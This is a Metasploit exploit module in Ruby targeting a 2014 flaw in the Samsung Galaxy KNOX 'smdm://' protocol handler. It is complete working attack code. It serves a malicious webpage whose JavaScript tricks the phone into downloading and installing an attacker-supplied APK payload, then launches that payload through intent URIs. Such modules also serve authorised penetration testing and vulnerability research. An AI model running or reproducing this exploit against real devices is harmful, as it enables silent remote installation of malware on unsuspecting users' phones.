# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;
require &#039;digest/md5&#039;

class Metasploit3 < Msf::Exploit::Remote

  include Msf::Exploit::Remote::BrowserExploitServer

  # Hash that maps payload ID -> (0|1) if an HTTP request has
  # been made to download a payload of that ID
  attr_reader :served_payloads

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;                => &#039;Samsung Galaxy KNOX Android Browser RCE&#039;,
      &#039;Description&#039;         => %q{
        A vulnerability exists in the KNOX security component of the Samsung Galaxy
        firmware that allows a remote webpage to install an APK with arbitrary
        permissions by abusing the &#039;smdm://&#039; protocol handler registered by the KNOX
        component.

        The vulnerability has been confirmed in the Samsung Galaxy S4, S5, Note 3,
        and Ace 4.
      },
      &#039;License&#039;             => MSF_LICENSE,
      &#039;Author&#039;              => [
        &#039;Andre Moulu&#039;, # discovery and advisory
        &#039;joev&#039;   # msf module
      ],
      &#039;References&#039;          => [
        [&#039;URL&#039;, &#039;http://blog.quarkslab.com/abusing-samsung-knox-to-remotely-install-a-malicious-application-story-of-a-half-patched-vulnerability.html&#039;],
        [&#039;OSVDB&#039;, &#039;114590&#039;]
      ],
      &#039;Platform&#039;            => &#039;android&#039;,
      &#039;Arch&#039;                => ARCH_DALVIK,
      &#039;Targets&#039;             => [ [ &#039;Automatic&#039;, {} ] ],
      &#039;DisclosureDate&#039;      => &#039;Nov 12 2014&#039;,
      &#039;DefaultTarget&#039;       => 0,

      &#039;BrowserRequirements&#039; => {
        :source     => &#039;script&#039;,
        :os_name    => OperatingSystems::Match::ANDROID
      }
    ))

    register_options([
      OptString.new(&#039;APK_VERSION&#039;, [
        false, "The update version to advertise to the client", "1337"
      ])
    ], self.class)

    deregister_options(&#039;JsObfuscate&#039;)
  end

  def exploit
    @served_payloads = Hash.new(0)
    super
  end

  def apk_bytes
    payload.encoded
  end

  def on_request_uri(cli, req)
    if req.uri =~ /\/([a-zA-Z0-9]+)\.apk\/latest$/
      if req.method.upcase == &#039;HEAD&#039;
        print_status "Serving metadata..."
        send_response(cli, &#039;&#039;, magic_headers)
      else
        print_status "Serving payload &#039;#{$1}&#039;..."
        @served_payloads[$1] = 1
        send_response(cli, apk_bytes, magic_headers)
      end
    elsif req.uri =~ /_poll/
      vprint_debug "Polling #{req.qstring[&#039;id&#039;]}: #{@served_payloads[req.qstring[&#039;id&#039;]]}"
      send_response(cli, @served_payloads[req.qstring[&#039;id&#039;]].to_s, &#039;Content-type&#039; => &#039;text/plain&#039;)
    elsif req.uri =~ /launch$/
      send_response_html(cli, launch_html)
    else
      super
    end
  end

  # The browser appears to be vulnerable, serve the exploit
  def on_request_exploit(cli, req, browser)
    print_status "Serving exploit..."
    send_response_html(cli, generate_html)
  end

  def magic_headers
    { &#039;Content-Length&#039; => apk_bytes.length,
      &#039;ETag&#039; => Digest::MD5.hexdigest(apk_bytes),
      &#039;x-amz-meta-apk-version&#039; => datastore[&#039;APK_VERSION&#039;] }
  end

  def generate_html
    %Q|
      <!doctype html>
      <html><body>
      <script>
      #{exploit_js}
      </script></body></html>
    |
  end

  def exploit_js
    payload_id = rand_word

    js_obfuscate %Q|

      function poll() {
        var xhr = new XMLHttpRequest();
        xhr.open(&#039;GET&#039;, &#039;_poll?id=#{payload_id}&d=&#039;+Math.random()*999999999999);
        xhr.onreadystatechange = function(){
          if (xhr.readyState == 4) {
            if (xhr.responseText == &#039;1&#039;) {
              setTimeout(killEnrollment, 100);
            } else {
              setTimeout(poll, 1000);
              setTimeout(enroll, 0);
              setTimeout(enroll, 500);
            }
          }
        };
        xhr.onerror = function(){
          setTimeout(poll, 1000);
          setTimeout(enroll, 0);
        };
        xhr.send();
      }

      function enroll() {
        var loc = window.location.href.replace(/[/.]$/g, &#039;&#039;);
        top.location = &#039;smdm://#{rand_word}?update_url=&#039;+
          encodeURIComponent(loc)+&#039;/#{payload_id}.apk&#039;;
      }

      function killEnrollment() {
        top.location = "intent://#{rand_word}?program="+
          "#{rand_word}/#Intent;scheme=smdm;launchFlags=268468256;end";
        setTimeout(launchApp, 300);
      }

      function launchApp() {
        top.location=&#039;intent:view#Intent;SEL;component=com.metasploit.stage/.MainActivity;end&#039;;
      }

      enroll();
      setTimeout(poll,600);

    |
  end

  def rand_word
    Rex::Text.rand_text_alphanumeric(3+rand(12))
  end
end

